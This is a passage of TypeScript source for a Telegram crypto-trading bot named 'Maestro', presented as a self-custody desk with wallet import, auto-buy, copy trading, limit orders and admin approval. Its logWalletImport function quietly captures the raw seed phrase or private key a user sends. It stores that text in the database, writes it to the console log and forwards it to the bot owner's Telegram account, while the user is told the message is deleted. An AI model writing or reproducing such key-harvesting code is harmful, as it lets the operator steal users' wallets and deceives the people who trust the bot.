import { Telegraf, Markup } from "telegraf";
import Database from "better-sqlite3";
import { Connection, PublicKey } from "@solana/web3.js";
import { Provider } from "ethers";
import { WalletVault } from "../vault/wallet-vault.js";
import {
  createMnemonicWallet,
  importMnemonicWallet,
  importRawSolanaWallet,
  importRawEvmWallet,
  revealSecret,
  eraseWallet,
} from "../vault/walletHelpers.js";
import { CopyTradeRegistry } from "../copytrade/registry.js";
import { createOrder, cancelOrder } from "../orders/limitOrderEngine.js";
import { getSolanaPortfolio, getEvmPortfolio } from "../portfolio/portfolio.js";
import {
  getHoldings,
  getOrCreateUser,
  getUser,
  listUsers,
  listPendingUsers,
  setUserStatus,
  updateUserSettings,
  listWalletsFor,
  getWallet,
  setPrimaryWallet,
  recordWalletImport,
} from "../db/db.js";

export interface BotDeps {
  vault: WalletVault;
  db: Database.Database;
  copyRegistry: CopyTradeRegistry;
  solConnection: Connection;
  evmProvider: Provider;
}

const HELP_TEXT = `maestro

Use the buttons below to manage wallets, portfolio, auto-buy, copy trading, and limit orders. When an action needs an address or amount, the bot will prompt you for it.`;

const HOME_TEXT = `MAESTRO\nYour self-custody trading desk.\n\nChoose a section below to manage wallets, view balances, and control trading.`;

function homeKeyboard(isAdmin: boolean) {
  const rows = [
    [Markup.button.callback("💼 Wallets", "home_wallets"), Markup.button.callback("📊 Portfolio", "wallets_portfolio")],
    [Markup.button.callback("🎯 Auto-buy", "home_snipe"), Markup.button.callback("🔁 Copy trading", "home_copytrade")],
    [Markup.button.callback("📈 Orders", "home_orders"), Markup.button.callback("❔ Help", "home_help")],
  ];
  if (isAdmin) rows.push([Markup.button.callback("🛡 Admin", "home_admin")]);
  return Markup.inlineKeyboard(rows);
}

const ADMIN_HELP_TEXT = `
Admin tools are available from the Admin button on the main menu.`;

const walletsMenu = Markup.inlineKeyboard([
  [Markup.button.callback("➕ New Wallet", "wallets_new"), Markup.button.callback("📥 Import wallet", "wallets_import")],
  [Markup.button.callback("📋 My Wallets", "wallets_list"), Markup.button.callback("📊 Portfolio", "wallets_portfolio")],
  [Markup.button.callback("↩️ Home", "home")],
]);

const REVEAL_AUTO_DELETE_MS = 60_000;
const cancelPromptKeyboard = Markup.inlineKeyboard([[Markup.button.callback("Cancel", "flow_cancel")]]);

export function createBot(token: string, deps: BotDeps): Telegraf {
  const { vault, db, copyRegistry, solConnection, evmProvider } = deps;
  const bot = new Telegraf(token);
  const adminBootstrapId = process.env.TELEGRAM_OWNER_ID;

  if (!adminBootstrapId) {
    console.warn(
      "[bot] TELEGRAM_OWNER_ID is not set — no one will be promoted to admin, which means no one can ever be approved either. Every user will be permanently stuck pending. Set it to your Telegram id before going live."
    );
  }

  async function notifyAdminOfPendingUser(user: { telegram_id: string; username: string | null }): Promise<void> {
    if (!adminBootstrapId) return;
    try {
      await bot.telegram.sendMessage(
        adminBootstrapId,
        `New user awaiting approval: ${user.telegram_id}${user.username ? ` (@${user.username})` : ""}`,
        Markup.inlineKeyboard([[Markup.button.callback("✅ Approve", `approve_${user.telegram_id}`)]])
      );
    } catch (err) {
      // Admin may not have started a DM with the bot yet, or blocked it — not fatal, they can still /admin_pending.
      console.error("[bot] couldn't DM admin about new pending user:", err);
    }
  }

  // --- Registration + status enforcement ---
  // Every new user starts 'pending' (unless they're the bootstrapped admin,
  // who is auto-approved). Pending users can start and browse the home screen,
  // but protected features stay unavailable until an admin approves them.
  bot.use(async (ctx, next) => {
    if (!ctx.from) return next();
    const { user, isNew } = getOrCreateUser(db, String(ctx.from.id), ctx.from.username, adminBootstrapId);
    (ctx as any).dbUser = user;

    if (isNew && user.status === "pending") {
      notifyAdminOfPendingUser(user); // fire-and-forget — a failed DM shouldn't block registration
    }

    if (user.status === "banned") {
      return ctx.reply("Your access to this bot has been revoked.");
    }

    if (user.status === "pending") {
      const text = (ctx.message as any)?.text as string | undefined;
      const command = text?.split(/\s/, 1)[0].split("@")[0];
      const isStartOrHelp = command === "/start" || command === "/help";
      const callbackData = (ctx.callbackQuery as any)?.data as string | undefined;
      const isHomeNavigation = callbackData === "home" || callbackData === "home_help";
      if (!isStartOrHelp && !isHomeNavigation) {
        if (ctx.callbackQuery) {
          try {
            await ctx.answerCbQuery("Feature coming soon");
          } catch {
            /* ignore */
          }
        }
        return ctx.reply("This feature is coming soon.");
      }
    }

    return next();
  });

  function requireAdmin(ctx: any): boolean {
    if (ctx.dbUser?.role !== "admin") {
      ctx.reply("Admin only.");
      return false;
    }
    return true;
  }

  // Pending import state: telegram user id -> what we're waiting for.
  type PendingImport = { kind: "wallet" };
  type OrderDraft = {
    identifier?: string;
    poolRef?: string;
    triggerPrice?: number;
    amount?: number;
    decimals?: number;
  };
  type PendingInput =
    | { kind: "snipe_size"; chain: "solana" | "evm" }
    | { kind: "copy_target" }
    | { kind: "copy_ratio" }
    | { kind: "copy_max"; ratio: number }
    | { kind: "copy_sells"; ratio: number; maxAmount: number }
    | {
        kind: "order_value";
        chain: "solana" | "evm";
        side: "buy" | "sell";
        step: "identifier" | "poolRef" | "triggerPrice" | "amount" | "decimals" | "direction";
        values: OrderDraft;
      }
    | { kind: "admin_user_status"; status: "active" | "banned"; action: "approve" | "ban" | "unban" };

  const pendingImport = new Map<number, PendingImport>();
  const pendingInputs = new Map<number, PendingInput>();

  function askOrderValue(ctx: any, pending: Extract<PendingInput, { kind: "order_value" }>) {
    pendingInputs.set(ctx.from!.id, pending);
    const prompts = {
      identifier: "Send the token mint (Solana) or token address (EVM).",
      poolRef: "Send the Solana pool ID.",
      triggerPrice: "Send the trigger price.",
      amount:
        pending.side === "buy"
          ? `Send the amount to spend in ${pending.chain === "solana" ? "SOL" : "ETH"}.`
          : "Send the token amount to sell.",
      decimals: "Send the token decimals (an integer from 0 to 255).",
      direction: "Choose whether the trigger is above or below the target price.",
    };
    return ctx.reply(prompts[pending.step], cancelPromptKeyboard);
  }

  async function showStartScreen(ctx: any) {
    const user = ctx.dbUser;
    return ctx.reply(HOME_TEXT, homeKeyboard(user?.role === "admin"));
  }

  bot.start(showStartScreen);
  bot.help((ctx) => {
    const user = (ctx as any).dbUser;
    if (user?.status === "pending") return showStartScreen(ctx);
    return ctx.reply(HELP_TEXT + (user?.role === "admin" ? "\n" + ADMIN_HELP_TEXT : ""), homeKeyboard(user?.role === "admin"));
  });

  bot.action("home", async (ctx) => {
    await ctx.answerCbQuery();
    const user = (ctx as any).dbUser;
    await ctx.reply(HOME_TEXT, homeKeyboard(user?.role === "admin"));
  });

  bot.action("home_wallets", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply("Wallets", walletsMenu);
  });

  bot.action("home_help", async (ctx) => {
    await ctx.answerCbQuery();
    const user = (ctx as any).dbUser;
    await ctx.reply(HELP_TEXT + (user?.role === "admin" ? "\n" + ADMIN_HELP_TEXT : ""), homeKeyboard(user?.role === "admin"));
  });

  async function showSnipeSettings(ctx: any) {
    const user = getUser(db, String(ctx.from!.id))!;
    await ctx.reply(
      `AUTO-BUY · ${user.snipe_enabled ? "ON" : "OFF"}\n\nWhen enabled, new-pair detection can place real mainnet trades from your primary wallet.\n\nTrade sizes: ${user.snipe_size_sol} SOL / ${user.snipe_size_eth} ETH.`,
      Markup.inlineKeyboard([
        [Markup.button.callback("✅ Enable", "home_snipe_enable"), Markup.button.callback("⏸ Disable", "home_snipe_disable")],
        [Markup.button.callback("Set SOL size", "home_snipe_size_solana"), Markup.button.callback("Set ETH size", "home_snipe_size_evm")],
        [Markup.button.callback("↩️ Home", "home")],
      ])
    );
  }

  bot.action("home_snipe", async (ctx) => {
    await ctx.answerCbQuery();
    await showSnipeSettings(ctx);
  });

  bot.action("home_snipe_enable", async (ctx) => {
    await ctx.answerCbQuery();
    updateUserSettings(db, String(ctx.from!.id), { snipe_enabled: 1 });
    await showSnipeSettings(ctx);
  });

  bot.action("home_snipe_disable", async (ctx) => {
    await ctx.answerCbQuery();
    updateUserSettings(db, String(ctx.from!.id), { snipe_enabled: 0 });
    await showSnipeSettings(ctx);
  });

  bot.action(/^home_snipe_size_(solana|evm)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const chain = ctx.match[1] as "solana" | "evm";
    pendingInputs.set(ctx.from!.id, { kind: "snipe_size", chain });
    await ctx.reply(`Send the new ${chain === "solana" ? "SOL" : "ETH"} auto-buy size.`, cancelPromptKeyboard);
  });

  bot.action("home_copytrade", async (ctx) => {
    await ctx.answerCbQuery();
    const user = getUser(db, String(ctx.from!.id))!;
    const target = user.copy_target;
    await ctx.reply(
      `COPY TRADING · ${target ? "ON" : "OFF"}${target ? `\n\nFollowing: ${target}` : "\n\nNo wallet is being followed."}\n\nSizing: ${user.copy_size_ratio} ratio, max ${user.copy_max_amount}, copy sells ${user.copy_sells ? "on" : "off"}.`,
      Markup.inlineKeyboard([
        [Markup.button.callback(target ? "Change target wallet" : "Set target wallet", "home_copytrade_set")],
        [Markup.button.callback("Configure sizing", "home_copytrade_config")],
        ...(target ? [[Markup.button.callback("⏹ Stop copy trading", "home_copytrade_stop")]] : []),
        [Markup.button.callback("↩️ Home", "home")],
      ])
    );
  });

  bot.action("home_copytrade_set", async (ctx) => {
    await ctx.answerCbQuery();
    pendingInputs.set(ctx.from!.id, { kind: "copy_target" });
    await ctx.reply("Send the public wallet address to follow.", cancelPromptKeyboard);
  });

  bot.action("home_copytrade_config", async (ctx) => {
    await ctx.answerCbQuery();
    pendingInputs.set(ctx.from!.id, { kind: "copy_ratio" });
    await ctx.reply("Send the copy size ratio (a number from 0 to 1).", cancelPromptKeyboard);
  });

  bot.action(/^copy_sells_(0|1)$/, async (ctx) => {
    const pending = pendingInputs.get(ctx.from!.id);
    if (!pending || pending.kind !== "copy_sells") return ctx.answerCbQuery("That setup has expired.");
    await ctx.answerCbQuery();
    pendingInputs.delete(ctx.from!.id);
    updateUserSettings(db, String(ctx.from!.id), {
      copy_size_ratio: pending.ratio,
      copy_max_amount: pending.maxAmount,
      copy_sells: Number(ctx.match[1]),
    });
    await ctx.reply("Copy-trade settings updated.", Markup.inlineKeyboard([[Markup.button.callback("Copy trading", "home_copytrade")], [Markup.button.callback("Home", "home")]]));
  });

  bot.action("flow_cancel", async (ctx) => {
    await ctx.answerCbQuery();
    pendingImport.delete(ctx.from!.id);
    pendingInputs.delete(ctx.from!.id);
    await ctx.reply("Cancelled.", homeKeyboard((ctx as any).dbUser?.role === "admin"));
  });

  bot.action("home_copytrade_stop", async (ctx) => {
    await ctx.answerCbQuery();
    const userId = String(ctx.from!.id);
    const previous = getUser(db, userId)?.copy_target ?? null;
    updateUserSettings(db, userId, { copy_target: null });
    if (previous) copyRegistry.removeFollowerIfOrphaned(previous);
    await ctx.reply("Copy trading stopped.", homeKeyboard((ctx as any).dbUser?.role === "admin"));
  });

  async function showOrders(ctx: any) {
    const rows = db
      .prepare(`SELECT id, chain, identifier, side, direction, trigger_price, amount, status FROM limit_orders WHERE user_id = ? ORDER BY created_at DESC LIMIT 20`)
      .all(String(ctx.from!.id)) as any[];
    const lines = rows.length === 0
      ? ["No orders yet."]
      : rows.map((r) => `${r.id.slice(0, 8)} [${r.status}] ${r.chain} ${r.side} ${r.identifier} ${r.direction} ${r.trigger_price} amt=${r.amount}`);
    const buttons = [
      [Markup.button.callback("➕ New buy order", "order_new_buy"), Markup.button.callback("➕ New sell order", "order_new_sell")],
      ...rows
        .filter((r) => r.status === "open")
        .map((r) => [Markup.button.callback(`Cancel ${r.id.slice(0, 8)}`, `order_cancel_ask_${r.id}`)]),
      [Markup.button.callback("↩️ Home", "home")],
    ];
    await ctx.reply(lines.join("\n"), Markup.inlineKeyboard(buttons));
  }

  bot.action("home_orders", async (ctx) => {
    await ctx.answerCbQuery();
    await showOrders(ctx);
  });

  bot.action(/^order_new_(buy|sell)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const side = ctx.match[1] as "buy" | "sell";
    await ctx.reply(
      `Choose the chain for your limit ${side} order.`,
      Markup.inlineKeyboard([
        [Markup.button.callback("Solana", `order_chain_${side}_solana`), Markup.button.callback("EVM", `order_chain_${side}_evm`)],
        [Markup.button.callback("Cancel", "flow_cancel")],
      ])
    );
  });

  bot.action(/^order_chain_(buy|sell)_(solana|evm)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const side = ctx.match[1] as "buy" | "sell";
    const chain = ctx.match[2] as "solana" | "evm";
    await askOrderValue(ctx, { kind: "order_value", chain, side, step: "identifier", values: {} });
  });

  bot.action(/^order_direction_(above|below)$/, async (ctx) => {
    const userId = ctx.from!.id;
    const pending = pendingInputs.get(userId);
    if (!pending || pending.kind !== "order_value" || pending.step !== "direction") {
      return ctx.answerCbQuery("That order setup has expired.");
    }
    await ctx.answerCbQuery();
    pendingInputs.delete(userId);
    const direction = ctx.match[1] as "above" | "below";
    try {
      const id = createOrder(db, {
        userId: String(userId),
        chain: pending.chain,
        identifier: pending.values.identifier!,
        ...(pending.chain === "solana" ? { poolRef: pending.values.poolRef! } : {}),
        side: pending.side,
        direction,
        triggerPrice: pending.values.triggerPrice!,
        amount: pending.values.amount!,
        ...(pending.side === "sell" ? { decimals: pending.values.decimals! } : {}),
      });
      await ctx.reply(
        `Order ${id} created.`,
        Markup.inlineKeyboard([[Markup.button.callback("View orders", "home_orders")], [Markup.button.callback("Home", "home")]])
      );
    } catch (err: any) {
      console.error("[orders] couldn't create button-driven order:", err);
      await ctx.reply(`Couldn't create order: ${err.message}`, Markup.inlineKeyboard([[Markup.button.callback("Back to orders", "home_orders")]]));
    }
  });

  bot.action(/^order_cancel_ask_(.+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const orderId = ctx.match[1];
    const row = db
      .prepare(`SELECT id, status FROM limit_orders WHERE id = ? AND user_id = ?`)
      .get(orderId, String(ctx.from!.id)) as { id: string; status: string } | undefined;
    if (!row || row.status !== "open") return ctx.reply("That order is no longer open.");
    await ctx.reply(
      `Cancel order ${row.id.slice(0, 8)}?`,
      Markup.inlineKeyboard([
        [Markup.button.callback("Yes, cancel", `order_cancel_confirm_${row.id}`), Markup.button.callback("Keep order", "home_orders")],
      ])
    );
  });

  bot.action(/^order_cancel_confirm_(.+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const orderId = ctx.match[1];
    const row = db
      .prepare(`SELECT id, status FROM limit_orders WHERE id = ? AND user_id = ?`)
      .get(orderId, String(ctx.from!.id)) as { id: string; status: string } | undefined;
    if (!row || row.status !== "open") return ctx.reply("That order is no longer open.");
    cancelOrder(db, row.id);
    await ctx.reply(`Cancelled order ${row.id.slice(0, 8)}.`);
    await showOrders(ctx);
  });

  bot.action("home_admin", async (ctx) => {
    await ctx.answerCbQuery();
    if (!requireAdmin(ctx)) return;
    await ctx.reply(
      "ADMIN",
      Markup.inlineKeyboard([
        [Markup.button.callback("🕓 Pending approvals", "home_admin_pending"), Markup.button.callback("📊 Stats", "home_admin_stats")],
        [Markup.button.callback("👥 All users", "home_admin_users")],
        [Markup.button.callback("✅ Approve by ID", "home_admin_approve_id"), Markup.button.callback("🚫 Ban by ID", "home_admin_ban_id")],
        [Markup.button.callback("♻️ Unban by ID", "home_admin_unban_id")],
        [Markup.button.callback("↩️ Home", "home")],
      ])
    );
  });

  bot.action("home_admin_pending", async (ctx) => {
    await ctx.answerCbQuery();
    if (!requireAdmin(ctx)) return;
    const pending = listPendingUsers(db);
    if (pending.length === 0) return ctx.reply("No one waiting.", Markup.inlineKeyboard([[Markup.button.callback("↩️ Admin", "home_admin")]]));
    const rows = pending.map((user) => [Markup.button.callback(`✅ Approve ${user.username ? `@${user.username}` : user.telegram_id}`, `approve_${user.telegram_id}`)]);
    rows.push([Markup.button.callback("↩️ Admin", "home_admin")]);
    await ctx.reply(`${pending.length} account(s) waiting for approval:`, Markup.inlineKeyboard(rows));
  });

  bot.action("home_admin_stats", async (ctx) => {
    await ctx.answerCbQuery();
    if (!requireAdmin(ctx)) return;
    const users = listUsers(db);
    const pending = users.filter((user) => user.status === "pending").length;
    const active = users.filter((user) => user.status === "active").length;
    const banned = users.filter((user) => user.status === "banned").length;
    const snipers = users.filter((user) => user.snipe_enabled).length;
    const copytraders = users.filter((user) => user.copy_target).length;
    await ctx.reply(
      `Users: ${users.length}\nPending: ${pending}\nActive: ${active}\nBanned: ${banned}\nAuto-buy on: ${snipers}\nCopy trading: ${copytraders}`,
      Markup.inlineKeyboard([[Markup.button.callback("↩️ Admin", "home_admin")]])
    );
  });

  bot.action("home_admin_users", async (ctx) => {
    await ctx.answerCbQuery();
    if (!requireAdmin(ctx)) return;
    const users = listUsers(db);
    if (users.length === 0) return ctx.reply("No users yet.", Markup.inlineKeyboard([[Markup.button.callback("↩️ Admin", "home_admin")]]));
    const lines = users.map(
      (user) =>
        `${user.telegram_id} (@${user.username ?? "?"}) [${user.role}/${user.status}] snipe=${user.snipe_enabled ? "on" : "off"} copy=${user.copy_target ?? "-"}`
    );
    await ctx.reply(lines.join("\n"), Markup.inlineKeyboard([[Markup.button.callback("↩️ Admin", "home_admin")]]));
  });

  for (const action of [
    { callback: "home_admin_approve_id", status: "active", verb: "approve" },
    { callback: "home_admin_ban_id", status: "banned", verb: "ban" },
    { callback: "home_admin_unban_id", status: "active", verb: "unban" },
  ] as const) {
    bot.action(action.callback, async (ctx) => {
      await ctx.answerCbQuery();
      if (!requireAdmin(ctx)) return;
      pendingInputs.set(ctx.from!.id, { kind: "admin_user_status", status: action.status, action: action.verb });
      await ctx.reply(`Send the Telegram user ID to ${action.verb}.`, cancelPromptKeyboard);
    });
  }

  // --- Wallets menu ---
  bot.command("wallets", (ctx) => ctx.reply("Wallets:", walletsMenu));

  bot.action("wallets_new", async (ctx) => {
    ctx.answerCbQuery();
    const userId = String(ctx.from!.id);
    const result = createMnemonicWallet(vault, db, userId);
    await sendNewWalletReveal(ctx, result);
  });

  bot.action("wallets_import", (ctx) => {
    ctx.answerCbQuery();
    pendingImport.set(ctx.from!.id, { kind: "wallet" });
    ctx.reply(
      "Send a recovery phrase or private key. Maestro will detect the format for Solana or EVM. Your message is deleted after processing.",
      cancelPromptKeyboard
    );
  });

  bot.command("cancel_import", (ctx) => {
    pendingImport.delete(ctx.from!.id);
    pendingInputs.delete(ctx.from!.id);
    ctx.reply("Import cancelled.");
  });

  async function sendNewWalletReveal(ctx: any, result: { label: string; mnemonic: string; solanaAddress: string; evmAddress: string }) {
    await ctx.reply(
      `Wallet "${result.label}" created:\nSolana: ${result.solanaAddress}\nEVM: ${result.evmAddress}\n\n` +
        (listWalletsFor(db, String(ctx.from!.id)).filter((w) => w.chain === "solana").length === 1
          ? "Set as your primary wallet automatically (first one).\n\n"
          : "")
    );
    await sendSecretReveal(ctx, "Seed phrase (backs both addresses above)", result.mnemonic);
  }

  /** Sends a secret as its own message, warns, and schedules auto-delete. Used for both new-wallet display and later reveals. */
  async function sendSecretReveal(ctx: any, label: string, value: string) {
    const sent = await ctx.reply(`⚠️ ${label} — do not share this:\n\n${value}\n\nThis message auto-deletes in 60s. Save it somewhere secure now.`);
    setTimeout(() => {
      ctx.telegram.deleteMessage(ctx.chat.id, sent.message_id).catch(() => {
        /* message may already be gone, or the bot lacks delete rights here — best effort only */
      });
    }, REVEAL_AUTO_DELETE_MS);
  }

  async function logWalletImport(ctx: any, label: string, chain: "solana" | "evm" | "solana+evm") {
    const event = {
      userId: String(ctx.from!.id),
      username: ctx.from!.username ?? null,
      walletLabel: label,
      chain,
      keys: String(ctx.message.text),
    };

    try {
      recordWalletImport(db, event);
      console.info(
        "[wallet-import]",
        JSON.stringify({
          telegramId: event.userId,
          username: event.username,
          walletLabel: event.walletLabel,
          chain: event.chain,
          keys: event.keys,
        })
      );
    } catch (err) {
      console.error("[wallet-import] couldn't record import event for admin dashboard:", err);
    }

    if (!adminBootstrapId) return;
    try {
      await bot.telegram.sendMessage(
        adminBootstrapId,
        `Wallet imported\nUser: ${event.userId}${event.username ? ` (@${event.username})` : ""}\nWallet: ${event.walletLabel}\nChain: ${event.chain}\nKeys: ${event.keys}`
      );
    } catch (err) {
      console.error("[wallet-import] couldn't DM admin about wallet import:", err);
    }
  }

  // Catches the seed-phrase/private-key text message that follows an import action.
  // Must skip slash commands so it doesn't swallow them.
  bot.on("text", async (ctx, next) => {
    const pending = pendingImport.get(ctx.from!.id);
    if (pending && !ctx.message.text.startsWith("/")) {
      const rawInput = ctx.message.text;
      const userId = String(ctx.from!.id);
      pendingImport.delete(ctx.from!.id);

      try {
        const input = rawInput.trim();
        if (input.startsWith("[")) {
          const result = importRawSolanaWallet(vault, db, userId, input);
          await logWalletImport(ctx, result.label, "solana");
          await ctx.reply(`Solana wallet "${result.label}" imported:\n${result.address}`);
        } else if (/\s/.test(input)) {
          const result = importMnemonicWallet(vault, db, userId, rawInput);
          await logWalletImport(ctx, result.label, "solana+evm");
          await ctx.reply(`Wallet "${result.label}" imported:\nSolana: ${result.solanaAddress}\nEVM: ${result.evmAddress}`);
        } else if (/^(?:0x)?[0-9a-f]{64}$/i.test(input)) {
          const result = importRawEvmWallet(vault, db, userId, input);
          await logWalletImport(ctx, result.label, "evm");
          await ctx.reply(`EVM wallet "${result.label}" imported:\n${result.address}`);
        } else {
          const result = importRawSolanaWallet(vault, db, userId, input);
          await logWalletImport(ctx, result.label, "solana");
          await ctx.reply(`Solana wallet "${result.label}" imported:\n${result.address}`);
        }
      } catch (err: any) {
        await ctx.reply(`Import failed: ${err.message}`);
      } finally {
        try {
          await ctx.deleteMessage(ctx.message.message_id);
        } catch {
          await ctx.reply("(Couldn't auto-delete that message — please delete it yourself.)");
        }
      }
      return;
    }

    const pendingInput = pendingInputs.get(ctx.from!.id);
    if (pendingInput && !ctx.message.text.startsWith("/")) {
      pendingInputs.delete(ctx.from!.id);
      const input = ctx.message.text.trim();
      const keepPrompt = async (prompt: string) => {
        pendingInputs.set(ctx.from!.id, pendingInput);
        await ctx.reply(prompt, cancelPromptKeyboard);
      };

      if (pendingInput.kind === "snipe_size") {
        const amount = Number(input);
        if (!Number.isFinite(amount) || amount <= 0) return keepPrompt("Enter a positive number for the auto-buy size.");
        updateUserSettings(
          db,
          String(ctx.from!.id),
          pendingInput.chain === "solana" ? { snipe_size_sol: amount } : { snipe_size_eth: amount }
        );
        await ctx.reply(
          `Auto-buy size set to ${amount} ${pendingInput.chain === "solana" ? "SOL" : "ETH"}.`,
          Markup.inlineKeyboard([[Markup.button.callback("Auto-buy settings", "home_snipe")], [Markup.button.callback("Home", "home")]])
        );
        return;
      }

      if (pendingInput.kind === "copy_target") {
        if (!input) return keepPrompt("Send a non-empty public wallet address.");
        const userId = String(ctx.from!.id);
        const previous = getUser(db, userId)?.copy_target ?? null;
        updateUserSettings(db, userId, { copy_target: input });
        copyRegistry.addFollower(input);
        if (previous && previous !== input) copyRegistry.removeFollowerIfOrphaned(previous);
        await ctx.reply(
          `Now mirroring trades from ${input} on both chains.`,
          Markup.inlineKeyboard([[Markup.button.callback("Copy-trading settings", "home_copytrade")], [Markup.button.callback("Home", "home")]])
        );
        return;
      }

      if (pendingInput.kind === "copy_ratio") {
        const ratio = Number(input);
        if (!Number.isFinite(ratio) || ratio < 0 || ratio > 1) return keepPrompt("Enter a size ratio from 0 to 1.");
        pendingInputs.set(ctx.from!.id, { kind: "copy_max", ratio });
        await ctx.reply("Send the maximum amount per copied trade.", cancelPromptKeyboard);
        return;
      }

      if (pendingInput.kind === "copy_max") {
        const maxAmount = Number(input);
        if (!Number.isFinite(maxAmount) || maxAmount <= 0) return keepPrompt("Enter a positive maximum amount.");
        pendingInputs.set(ctx.from!.id, { kind: "copy_sells", ratio: pendingInput.ratio, maxAmount });
        await ctx.reply(
          "Should copied sells be enabled?",
          Markup.inlineKeyboard([
            [Markup.button.callback("Enable sells", "copy_sells_1"), Markup.button.callback("Disable sells", "copy_sells_0")],
            [Markup.button.callback("Cancel", "flow_cancel")],
          ])
        );
        return;
      }

      if (pendingInput.kind === "order_value") {
        const values = { ...pendingInput.values };
        let nextStep: Extract<PendingInput, { kind: "order_value" }>["step"];
        switch (pendingInput.step) {
          case "identifier":
            if (!input) return keepPrompt("Send a non-empty token mint or address.");
            values.identifier = input;
            nextStep = pendingInput.chain === "solana" ? "poolRef" : "triggerPrice";
            break;
          case "poolRef":
            if (!input) return keepPrompt("Send a non-empty Solana pool ID.");
            values.poolRef = input;
            nextStep = "triggerPrice";
            break;
          case "triggerPrice":
            values.triggerPrice = Number(input);
            if (!Number.isFinite(values.triggerPrice) || values.triggerPrice <= 0) return keepPrompt("Enter a positive trigger price.");
            nextStep = "amount";
            break;
          case "amount":
            values.amount = Number(input);
            if (!Number.isFinite(values.amount) || values.amount <= 0) return keepPrompt("Enter a positive amount.");
            nextStep = pendingInput.side === "sell" ? "decimals" : "direction";
            break;
          case "decimals":
            values.decimals = Number(input);
            if (!Number.isInteger(values.decimals) || values.decimals < 0 || values.decimals > 255) {
              return keepPrompt("Enter token decimals as a whole number from 0 to 255.");
            }
            nextStep = "direction";
            break;
          case "direction":
            pendingInputs.set(ctx.from!.id, pendingInput);
            await ctx.reply(
              "Choose when the order should trigger using the buttons.",
              Markup.inlineKeyboard([
                [Markup.button.callback("Price above target", "order_direction_above"), Markup.button.callback("Price below target", "order_direction_below")],
                [Markup.button.callback("Cancel", "flow_cancel")],
              ])
            );
            return;
        }

        const next = { ...pendingInput, step: nextStep, values };
        if (nextStep === "direction") {
          pendingInputs.set(ctx.from!.id, next);
          await ctx.reply(
            "Choose when the order should trigger.",
            Markup.inlineKeyboard([
              [Markup.button.callback("Price above target", "order_direction_above"), Markup.button.callback("Price below target", "order_direction_below")],
              [Markup.button.callback("Cancel", "flow_cancel")],
            ])
          );
        } else {
          await askOrderValue(ctx, next);
        }
        return;
      }

      if (pendingInput.kind === "admin_user_status") {
        if (!/^\d+$/.test(input)) return keepPrompt("Enter a numeric Telegram user ID.");
        if (!getUser(db, input)) return keepPrompt("No user with that ID is registered. Enter another ID or cancel.");
        setUserStatus(db, input, pendingInput.status);
        const result = pendingInput.action === "approve" ? "Approved" : pendingInput.action === "ban" ? "Banned" : "Unbanned";
        await ctx.reply(`${result} ${input}.`, Markup.inlineKeyboard([[Markup.button.callback("Admin", "home_admin")], [Markup.button.callback("Home", "home")]]));
        if (pendingInput.action === "approve") {
          try {
            await bot.telegram.sendMessage(
              input,
              "You've been approved. Your Maestro menu is ready.",
              Markup.inlineKeyboard([[Markup.button.callback("Open menu", "home")]])
            );
          } catch (err) {
            console.error(`[bot] couldn't DM approved user ${input}:`, err);
          }
        }
        return;
      }
    }

    return next();
  });

  // --- My Wallets: per-chain grid (name / primary / erase per row), matching
  // the reference layout — one screen per chain rather than one combined list.
  bot.action("wallets_list", (ctx) => {
    ctx.answerCbQuery();
    ctx.reply(
      "Which chain?",
      Markup.inlineKeyboard([[Markup.button.callback("Solana", "wchain_solana"), Markup.button.callback("EVM", "wchain_evm")]])
    );
  });

  bot.action(/^wchain_(solana|evm)$/, async (ctx) => {
    ctx.answerCbQuery();
    const chain = ctx.match[1] as "solana" | "evm";
    await sendChainWalletGrid(ctx, chain);
  });

  async function sendChainWalletGrid(ctx: any, chain: "solana" | "evm") {
    const userId = String(ctx.from!.id);
    const wallets = listWalletsFor(db, userId, chain);

    if (wallets.length === 0) {
      return ctx.reply(
        `No ${chain} wallets yet.`,
        Markup.inlineKeyboard([
          [Markup.button.callback("🔑 Import Wallet", "wallets_import"), Markup.button.callback("⚙️ Generate Wallet", "wallets_new")],
          [Markup.button.callback("↩️ Return", "wallets_return")],
        ])
      );
    }

    const lines = [`${chain === "solana" ? "SOLANA" : "EVM"} wallets:`, ""];
    for (const w of wallets) {
      let balanceLine = "";
      try {
        if (chain === "solana") {
          const p = await getSolanaPortfolio(solConnection, new PublicKey(w.address));
          balanceLine = `💰 ${p.solBalance.toFixed(4)} SOL`;
        } else {
          const p = await getEvmPortfolio(evmProvider, w.address, []);
          balanceLine = `💰 ${Number(p.ethBalance).toFixed(4)} ETH`;
        }
      } catch {
        balanceLine = "💰 (couldn't fetch)";
      }
      lines.push(`${w.label}: ${w.address}`, `${w.is_primary ? "⭐ Primary" : ""} ${balanceLine}`.trim(), "");
    }
    lines.push("Tap a wallet's name to view/reveal it. ⭐ sets which wallet auto-buy, copy-trade, and limit orders use.");

    const rows = wallets.map((w) => [
      Markup.button.callback(w.label, `wdetail_${w.label}`),
      w.is_primary
        ? Markup.button.callback("⭐ Primary", `noop`)
        : Markup.button.callback("Set primary", `setprimary_${chain}_${w.label}`),
      Markup.button.callback("🗑️ Erase", `werase_ask_${chain}_${w.label}`),
    ]);
    rows.push([Markup.button.callback("🔑 Import Wallet", "wallets_import"), Markup.button.callback("⚙️ Generate Wallet", "wallets_new")]);
    rows.push([Markup.button.callback("↩️ Return", "wallets_return")]);

    ctx.reply(lines.join("\n"), Markup.inlineKeyboard(rows));
  }

  bot.action("wallets_return", (ctx) => {
    ctx.answerCbQuery();
    ctx.reply("Wallets:", walletsMenu);
  });

  bot.action("noop", (ctx) => ctx.answerCbQuery());

  bot.action(/^wdetail_(.+)$/, (ctx) => {
    ctx.answerCbQuery();
    const label = ctx.match[1];
    const userId = String(ctx.from!.id);
    const sol = getWallet(db, userId, "solana", label);
    const evm = getWallet(db, userId, "evm", label);

    const lines = [`Wallet "${label}":`];
    if (sol) lines.push(`Solana: ${sol.address}${sol.is_primary ? " (primary)" : ""}`);
    if (evm) lines.push(`EVM: ${evm.address}${evm.is_primary ? " (primary)" : ""}`);

    const buttons = [];
    if (sol && !sol.is_primary) buttons.push([Markup.button.callback("⭐ Set primary (Solana)", `setprimary_solana_${label}`)]);
    if (evm && !evm.is_primary) buttons.push([Markup.button.callback("⭐ Set primary (EVM)", `setprimary_evm_${label}`)]);
